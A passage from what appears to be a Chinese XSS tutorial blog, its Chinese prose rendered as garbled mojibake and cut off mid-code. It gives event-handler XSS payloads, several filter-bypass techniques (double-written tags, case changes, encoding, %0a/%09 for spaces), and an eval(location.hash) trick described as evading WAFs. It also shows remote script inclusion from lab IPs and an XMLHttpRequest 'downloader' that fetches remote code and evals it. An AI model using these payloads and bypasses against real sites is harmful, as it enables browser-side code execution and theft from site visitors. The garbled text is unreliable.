class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ©ç”¨CSSè·¨ç«™ï¼ˆoldï¼‰ä¸»æµæµè§ˆå™¨ä¸æ”¯æŒï¼ŒIE6å¯ä»¥ï¼ˆIEæµè§ˆå™¨å·²é€€å‡ºå†å²èˆå°ï¼‰ã€‚</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250202183823061.png" style="zoom:73%;"><blockquote><h3 id="ä»€ä¹ˆæ˜¯javascriptä¼ªåè®®"><a href="#ä»€ä¹ˆæ˜¯javascriptä¼ªåè®®" class="headerlink" title="ä»€ä¹ˆæ˜¯javascriptä¼ªåè®®?"></a>ä»€ä¹ˆæ˜¯javascriptä¼ªåè®®?</h3><p>JavaScript ä¼ªåè®®æ˜¯ä¸€ç§åœ¨ URL ä¸­ä½¿ç”¨ <code>javascript:</code> æ¥æ‰§è¡Œ JavaScript ä»£ç çš„æ–¹å¼ã€‚å®ƒå…è®¸åœ¨é“¾æ¥æˆ–åœ°å€æ ä¸­ç›´æ¥è¿è¡Œ JavaScript ä»£ç ï¼Œè€Œä¸æ˜¯åŠ è½½ä¸€ä¸ªæ–°é¡µé¢ã€‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert('Hello, World!');<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»æˆ‘<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç‚¹å‡»è¿™ä¸ªé“¾æ¥æ—¶ï¼Œæµè§ˆå™¨ä¼šæ‰§è¡Œ <code>alert('Hello, World!');</code>ï¼Œè€Œä¸æ˜¯è·³è½¬åˆ°ä¸€ä¸ªæ–°é¡µé¢ã€‚</p></blockquote><h3 id="3-1-3-äº‹ä»¶"><a href="#3-1-3-äº‹ä»¶" class="headerlink" title="3.1.3 äº‹ä»¶"></a>3.1.3 äº‹ä»¶</h3><p>â€œäº‹ä»¶é©±åŠ¨â€æ˜¯ä¸€ç§æ¯”è¾ƒç»å…¸çš„ç¼–ç¨‹æ€æƒ³ã€‚åœ¨ç½‘é¡µä¸­ä¼šå‘ç”Ÿå¾ˆå¤šäº‹ä»¶(æ¯”å¦‚é¼ æ ‡ç§»åŠ¨ï¼Œé”®ç›˜è¾“å…¥ç­‰)ï¼ŒJSå¯ä»¥å¯¹è¿™äº›äº‹ä»¶è¿›è¡Œå“åº”ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡äº‹ä»¶è§¦å‘JSå‡½æ•°ï¼Œè§¦å‘XSSã€‚</p><p>windows äº‹ä»¶ï¼šå¯¹windowså¯¹è±¡è§¦å‘çš„äº‹ä»¶ã€‚</p><p>Formäº‹ä»¶ï¼šHTMLè¡¨å•å†…çš„åŠ¨ä½œè§¦å‘äº‹ä»¶ã€‚</p><p>Keyboard äº‹ä»¶ï¼šé”®ç›˜æŒ‰é”®ã€‚</p><p>Mouse äº‹ä»¶ï¼šç”±é¼ æ ‡æˆ–ç±»ä¼¼ç”¨æˆ·åŠ¨ä½œè§¦å‘çš„äº‹ä»¶ã€‚</p><p>Media äº‹ä»¶ï¼šç”±å¤šåª’ä½“è§¦å‘çš„äº‹ä»¶ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">'./smile.jpg'</span> onmouseover<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span><span class="token operator">&gt;</span> <span class="token comment">//é¼ æ ‡æ‚¬åœåœ¨å›¾ç‰‡ä¸Šçš„æ—¶å€™ï¼Œä¼šè§¦å‘XSSä»£ç </span><span class="token operator">&lt;</span>input type<span class="token operator">=</span> <span class="token string">"text"</span> onkeydown<span class="token operator">=</span><span class="token string">"alert(/xss/)"</span><span class="token operator">&gt;</span> <span class="token comment">//å½“ç‚¹å‡»é”®ç›˜ä»»æ„ä¸€ä¸ªæŒ‰é”®çš„æ—¶å€™è§¦å‘ã€‚</span><span class="token operator">&lt;</span>input type<span class="token operator">=</span> <span class="token string">"text"</span> onkeyup<span class="token operator">=</span><span class="token string">"alert(/xss/)"</span><span class="token operator">&gt;</span> <span class="token comment">//æ¾å¼€é”®ç›˜æŒ‰é’®è§¦å‘</span><span class="token operator">&lt;</span>input type<span class="token operator">=</span> <span class="token string">"button"</span> onclick<span class="token operator">=</span><span class="token string">"alert(/xss/)"</span> <span class="token comment">//ç‚¹å‡»æŒ‰é’®è§¦å‘</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">'./smile.jpg'</span> onerror<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span><span class="token operator">&gt;</span> <span class="token comment">//æ–‡æ¡£è½½å…¥å¤±è´¥è§¦å‘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="åŸºäºäº‹ä»¶è§¦å‘XSSå®æˆ˜ï¼š"><a href="#åŸºäºäº‹ä»¶è§¦å‘XSSå®æˆ˜ï¼š" class="headerlink" title="åŸºäºäº‹ä»¶è§¦å‘XSSå®æˆ˜ï¼š"></a>åŸºäºäº‹ä»¶è§¦å‘XSSå®æˆ˜ï¼š</h4><ul><li>é¼ æ ‡æ‚¬åœè§¦å‘XSS</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>./smile.jpg<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onmouseover</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªæ ‡ç­¾ä¼šå¼•å…¥ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶åé¼ æ ‡æ‚¬åœåœ¨å›¾ç‰‡ä¸Šçš„æ—¶å€™ï¼Œä¼šè§¦å‘XSSä»£ç ã€‚</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%888.26.28.png" style="zoom:35%;"><ul><li>å•è¡Œæ–‡æœ¬æ¡†çš„é”®ç›˜ç‚¹å‡»äº‹ä»¶</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onkeydown</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“ç‚¹å‡»é”®ç›˜ä»»æ„ä¸€ä¸ªæŒ‰é”®çš„æ—¶å€™è§¦å‘ã€‚</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-19%20%E4%B8%8B%E5%8D%888.27.35.png" style="zoom:35%;"></blockquote><h3 id="3-1-4-å…¶ä»–æ ‡ç­¾å’Œæ‰‹æ³•"><a href="#3-1-4-å…¶ä»–æ ‡ç­¾å’Œæ‰‹æ³•" class="headerlink" title="3.1.4 å…¶ä»–æ ‡ç­¾å’Œæ‰‹æ³•"></a>3.1.4 å…¶ä»–æ ‡ç­¾å’Œæ‰‹æ³•</h3><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250202184242145.png" style="zoom:80%;"><h2 id="3-2-å…«ç§å˜å½¢ï¼ˆä¸ºäº†ç»•è¿‡è¿‡æ»¤å™¨çš„æ£€æµ‹ï¼‰æ–¹æ³•"><a href="#3-2-å…«ç§å˜å½¢ï¼ˆä¸ºäº†ç»•è¿‡è¿‡æ»¤å™¨çš„æ£€æµ‹ï¼‰æ–¹æ³•" class="headerlink" title="3.2 å…«ç§å˜å½¢ï¼ˆä¸ºäº†ç»•è¿‡è¿‡æ»¤å™¨çš„æ£€æµ‹ï¼‰æ–¹æ³•"></a>3.2 å…«ç§å˜å½¢ï¼ˆä¸ºäº†ç»•è¿‡è¿‡æ»¤å™¨çš„æ£€æµ‹ï¼‰æ–¹æ³•</h2><h3 id="3-2-1-åŒå†™ç»•è¿‡"><a href="#3-2-1-åŒå†™ç»•è¿‡" class="headerlink" title="3.2.1 åŒå†™ç»•è¿‡"></a>3.2.1 åŒå†™ç»•è¿‡</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>scr<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>ipt<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-2-å¤§å°å†™è½¬æ¢ï¼ˆç”¨åœ¨æ ‡ç­¾åå’Œå±æ€§åä¸Šï¼‰"><a href="#3-2-2-å¤§å°å†™è½¬æ¢ï¼ˆç”¨åœ¨æ ‡ç­¾åå’Œå±æ€§åä¸Šï¼‰" class="headerlink" title="3.2.2 å¤§å°å†™è½¬æ¢ï¼ˆç”¨åœ¨æ ‡ç­¾åå’Œå±æ€§åä¸Šï¼‰"></a>3.2.2 å¤§å°å†™è½¬æ¢ï¼ˆç”¨åœ¨æ ‡ç­¾åå’Œå±æ€§åä¸Šï¼‰</h3><p>âš ï¸åŸç†ï¼šHTMLå¯¹å¤§å°å†™ä¸æ•æ„Ÿã€JSå¯¹å¤§å°å†™æ•æ„Ÿã€‚</p><p>jså¯¹å¤§å°å†™æ•æ„Ÿï¼Œé‚£ä¹ˆjsè¿‡æ»¤å™¨å°±éœ€è¦è€ƒè™‘å¤§å°å†™çš„ä¸åŒï¼Œä¸€æ—¦æ²¡æœ‰è€ƒè™‘å‘¨å…¨ï¼Œé‚£ä¹ˆç»•è¿‡å»çš„æ¶æ„ä»£ç å°±å¯ä»¥è¢«htmlè§£ææ‰§è¡Œï¼Œå› ä¸ºhtmlä¸åœ¨æ„å¤§å°å†™ã€‚</p><p>ä¾‹å­ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250202190437065.png" style="zoom:80%;"><h3 id="3-2-3-å¼•å·çš„ä½¿ç”¨"><a href="#3-2-3-å¼•å·çš„ä½¿ç”¨" class="headerlink" title="3.2.3 å¼•å·çš„ä½¿ç”¨"></a>3.2.3 å¼•å·çš„ä½¿ç”¨</h3><p>âš ï¸åŸç†ï¼šHTMLå¯¹å¼•å·ä¸æ•æ„Ÿï¼Œä½†æ˜¯æŸäº›è¿‡æ»¤å‡½æ•°å¯¹å¼•å·æ•æ„Ÿ</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250206100217389.png" style="zoom:80%;"><h3 id="3-2-4-ä»£æ›¿ç©ºæ ¼"><a href="#3-2-4-ä»£æ›¿ç©ºæ ¼" class="headerlink" title="3.2.4 [/]ä»£æ›¿ç©ºæ ¼"></a>3.2.4 [/]ä»£æ›¿ç©ºæ ¼</h3><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250206100355093.png" style="zoom:80%;"><p>é™¤äº†æ­£æ–œæ <code>/</code>ç»•è¿‡ç©ºæ ¼è¿‡æ»¤å¤–ï¼Œä¸‹é¢çš„ç¬¦å·ä¹Ÿå¯ä»¥ç”¨äºç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æ¢è¡Œç¬¦ï¼ˆLFï¼‰ï¼š%0aåˆ¶è¡¨ç¬¦ï¼ˆHTï¼‰ï¼š%09å›è½¦ç¬¦ï¼ˆCRï¼‰ï¼š%0d<span class="token variable"><span class="token variable">`</span>%0a%0d<span class="token variable">`</span></span>å’Œ<span class="token variable"><span class="token variable">`</span>%0d%0a<span class="token variable">`</span></span>ç»„åˆä½¿ç”¨ä¹Ÿå¯ä»¥ç”¨æ¥å°è¯•ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-5-æ°´å¹³åˆ¶è¡¨ç¬¦ã€å›è½¦ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰"><a href="#3-2-5-æ°´å¹³åˆ¶è¡¨ç¬¦ã€å›è½¦ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰" class="headerlink" title="3.2.5 æ°´å¹³åˆ¶è¡¨ç¬¦ã€å›è½¦ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰"></a>3.2.5 æ°´å¹³åˆ¶è¡¨ç¬¦ã€å›è½¦ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰</h3><p>å¯ä»¥åœ¨ä¸€äº›ä½ç½®æ·»åŠ Tab (æ°´å¹³åˆ¶è¡¨ç¬¦)å’Œå›è½¦ç¬¦ï¼Œæ¥ç»•è¿‡å…³é”®å­—æ£€æµ‹ã€‚</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250206100444528.png" style="zoom:40%;"><h3 id="3-2-6-å¯¹æ ‡ç­¾çš„å±æ€§å€¼è¿›è¡Œè½¬ç ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰"><a href="#3-2-6-å¯¹æ ‡ç­¾çš„å±æ€§å€¼è¿›è¡Œè½¬ç ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰" class="headerlink" title="3.2.6 å¯¹æ ‡ç­¾çš„å±æ€§å€¼è¿›è¡Œè½¬ç ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰"></a>3.2.6 å¯¹æ ‡ç­¾çš„å±æ€§å€¼è¿›è¡Œè½¬ç ï¼ˆç”¨åœ¨å±æ€§å€¼ä¸Šï¼‰</h3><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250206100614940.png" style="zoom:80%;"><h3 id="3-2-7-æ‹†åˆ†è·¨ç«™"><a href="#3-2-7-æ‹†åˆ†è·¨ç«™" class="headerlink" title="3.2.7 æ‹†åˆ†è·¨ç«™"></a>3.2.7 æ‹†åˆ†è·¨ç«™</h3><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/image-20250206100727886.png" style="zoom:80%;"><h1 id="å››ã€shellcodeçš„è°ƒç”¨"><a href="#å››ã€shellcodeçš„è°ƒç”¨" class="headerlink" title="å››ã€shellcodeçš„è°ƒç”¨"></a>å››ã€shellcodeçš„è°ƒç”¨</h1><p>Shellcodeå°±æ˜¯åœ¨åˆ©ç”¨æ¼æ´æ—¶æ‰€æ‰§è¡Œçš„ä»£ç ã€‚å®Œæ•´çš„XSSæ”»å‡»ï¼Œä¼šå°†Shellcodeå­˜æ”¾åœ¨ä¸€å®šçš„åœ°æ–¹ï¼Œ ç„¶åè§¦å‘æ¼æ´ï¼Œè°ƒç”¨Shellcodeã€‚</p><h2 id="4-1-è¿œç¨‹è°ƒç”¨"><a href="#4-1-è¿œç¨‹è°ƒç”¨" class="headerlink" title="4.1 è¿œç¨‹è°ƒç”¨"></a>4.1 è¿œç¨‹è°ƒç”¨</h2><p>åˆ©ç”¨imgã€scriptç­‰æ ‡ç­¾çš„srcå±æ€§ï¼Œé€šè¿‡httpè¯·æ±‚ï¼Œè¿œç¨‹åŒ…å«shellcodeã€‚</p><p>å¯ä»¥å°†JSä»£ç å•ç‹¬æ”¾åœ¨ä¸€ä¸ªjsæ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡httpåè®®è¿œç¨‹åŠ è½½è¯¥è„šæœ¬ã€‚å¦‚:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http:/ /172.16.132.138/XSS -TEST/normal/xss.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æ–¹å¼ã€‚</p><blockquote><h4 id="è¿œç¨‹è°ƒç”¨XSS-shellcodeå®æˆ˜"><a href="#è¿œç¨‹è°ƒç”¨XSS-shellcodeå®æˆ˜" class="headerlink" title="è¿œç¨‹è°ƒç”¨XSS shellcodeå®æˆ˜"></a>è¿œç¨‹è°ƒç”¨XSS shellcodeå®æˆ˜</h4><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-21%20%E4%B8%8B%E5%8D%888.18.32.png" style="zoom:75%;"><p>payloadï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.33.4/xss.js<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.33.4/xss.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-04-21%20%E4%B8%8B%E5%8D%888.21.22.png" style="zoom:45%;"><p>ç†è§£å±å®³ï¼Ÿ</p><p>ä¸€æ—¦æœåŠ¡å™¨å­˜åœ¨xssæ¼æ´ï¼Œä»¥åå°„å‹ä¸ºä¾‹ï¼Œé»‘å®¢å¯ä»¥æ„é€ æ¶æ„é“¾æ¥æˆ–è€…å›¾ç‰‡ï¼Œè¯±å¯¼ç”¨æˆ·ä¸»åŠ¨è§¦å‘XSSæ¼æ´ï¼Œè¿œç¨‹åŒ…å«shellcodeï¼Œè¿›è€Œæ”»å‡»å—å®³è€…ã€‚</p></blockquote><h2 id="4-2-window-location-hash"><a href="#4-2-window-location-hash" class="headerlink" title="4.2 window.location.hash"></a>4.2 window.location.hash</h2><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨jsä¸­çš„windows.location.hashæ–¹æ³•è·å–æµè§ˆå™¨URLåœ°å€æ çš„XSSä»£ç ã€‚</p><p>windows. location.hashä¼šè·å–URLä¸­#åé¢çš„å†…å®¹ï¼Œä¾‹å¦‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">[http: /domain. com/ index . php#AJEST]ï¼Œ windows.location.hashçš„å€¼å°±[#AJEST]ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ä»£ç </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?submit<span class="token operator">=</span>submit<span class="token operator">&amp;</span><span class="token assign-left variable">xsscode</span><span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>eval<span class="token punctuation">(</span>location.hash.substr<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span><span class="token comment">#alert(/XSS/)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›´æ¥æäº¤åˆ°æµ‹è¯•é¡µé¢xss.phpã€‚</p><blockquote><h4 id="window-location-hashæ‰§è¡Œxssä»£ç ç¤ºä¾‹"><a href="#window-location-hashæ‰§è¡Œxssä»£ç ç¤ºä¾‹" class="headerlink" title="window.location.hashæ‰§è¡Œxssä»£ç ç¤ºä¾‹"></a>window.location.hashæ‰§è¡Œxssä»£ç ç¤ºä¾‹</h4><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-24%20%E4%B8%8A%E5%8D%8811.00.06.png" style="zoom:45%;"><p>åˆ©ç”¨windows.location.hash+substræ–¹æ³•è·å–#åé¢çš„JSä»£ç ï¼Œå¸¦å…¥evalå‡½æ•°æ‰§è¡Œã€‚</p><p>ç³»ç»Ÿåœ¨å¯¹nameçš„å€¼è¿›è¡Œå›æ˜¾çš„æ—¶å€™ï¼Œæµè§ˆå™¨ç›‘æµ‹åˆ°<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œè§£é‡Šæ‰§è¡Œå…¶ä¸­çš„JSä»£ç ã€‚</p></blockquote><p>å‚æ•°ä¸ä¼šæäº¤åˆ°æœåŠ¡å™¨ï¼Œä¸å®¹æ˜“è¢«WAFæ£€æµ‹åˆ°ã€‚</p><h2 id="4-3-XSS-ä¸‹è½½å™¨"><a href="#4-3-XSS-ä¸‹è½½å™¨" class="headerlink" title="4.3 XSS ä¸‹è½½å™¨"></a>4.3 XSS ä¸‹è½½å™¨</h2><p>å°†æ¶æ„ä»£ç åŒ…å«åœ¨ä¸€ä¸ªç½‘é¡µä¸­ï¼Œåˆ©ç”¨AJAXæŠ€æœ¯è·å–ç½‘é¡µï¼Œæå–æ¶æ„ä»£ç ã€‚</p><p>åœ¨ä½¿ç”¨XSS Downloaderä¹‹å‰éœ€è¦ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„é¡µé¢ï¼Œxss_downloader.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-24%20%E4%B8%8A%E5%8D%8811.18.51.png" style="zoom:55%;"><p>å¸¸è§çš„ä¸‹è½½å™¨å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token keyword">function</span> <span class="token constant">XSS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span> ActiveXObject<span class="token punctuation">)</span> <span class="token punctuation">{</span>a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ActiveX0bject</span> <span class="token punctuation">(</span><span class="token string">"Microsoft. XMLHTTP"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>a<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'http: /172.16.132.161/XSS-TESTnormal/xss_downloader.php'</span> <span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span>a<span class="token punctuation">.</span>responseText <span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span> b<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">index0f</span><span class="token punctuation">(</span> <span class="token string">'BOF| '</span> <span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">index0f</span><span class="token punctuation">(</span><span class="token string">'EOF'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token constant">XSS</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åº”å¯¹åŒæºç­–ç•¥é™åˆ¶ï¼š</p><p>AJAXæŠ€æœ¯ä¼šå—åˆ°æµè§ˆå™¨åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡å™¨ç«¯ä»£ç ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">' Access-Control-Allow-Origin: *'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">' Access-Control-Allow-Headers: Origin, X-Requested-With ,Content-Type, Accept'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="é€šè¿‡XSSä¸‹è½½å™¨æ‰§è¡Œshellcodeå®æˆ˜"><a href="#é€šè¿‡XSSä¸‹è½½å™¨æ‰§è¡Œshellcodeå®æˆ˜" class="headerlink" title="é€šè¿‡XSSä¸‹è½½å™¨æ‰§è¡Œshellcodeå®æˆ˜"></a>é€šè¿‡XSSä¸‹è½½å™¨æ‰§è¡Œshellcodeå®æˆ˜</h4><p>1ã€å‡†å¤‡åŒ…å«XSS shellcodeä»£ç çš„é¡µé¢ï¼š</p><p> <a href="http://192.168.33.4/xss-script/xssdownloader.php">http://192.168.33.4/xss-script/xssdownloader.php</a></p><img src="/2025/02/01/web-an-quan/xss-kua-zhan-jiao-ben-gong-ji/%E6%88%AA%E5%B1%8F2021-06-24%20%E4%B8%8A%E5%8D%8811.28.10.png" style="zoom:75%;"><p>2ã€ç”¨XSSä¸‹è½½å™¨æå–ä»£ç å¹¶æ‰§è¡Œã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token keyword">function</span> <span class="token constant">XSS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>ActiveXObject<span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span>a<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span><span class="token string">' http://192.168.33.4/xss-script/xssdownloader.php'</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">send</span><span class="token 